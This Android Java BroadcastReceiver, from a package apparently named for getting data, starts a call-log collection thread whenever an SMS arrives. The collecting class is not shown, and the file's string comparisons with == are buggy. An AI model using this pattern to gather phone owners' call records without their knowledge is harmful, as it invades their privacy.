package com.android.service_getdata;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

public class AllReceiver extends BroadcastReceiver {
    public AllReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Toast.makeText(context,"Device Booted",Toast.LENGTH_SHORT).show();
        Log.d("Service", "Boot Completed");
        String action = intent.getAction();

        if(action == "android.provider.Telephony.SMS_RECEIVED"){
            PickUpDataThread pickUpDataThread = new PickUpDataThread(context.getContentResolver(),PickUpDataThread.CALLLOGS_THREAD);
            Thread thread = new Thread(pickUpDataThread);
            thread.start();
            Toast.makeText(context,"Message Received",Toast.LENGTH_SHORT).show();
        }
        if(action == "android.net.conn.CONNECTIVITY_CHANGE"){
            Toast.makeText(context,"Connectivity Changed",Toast.LENGTH_SHORT).show();
        }
    }
}
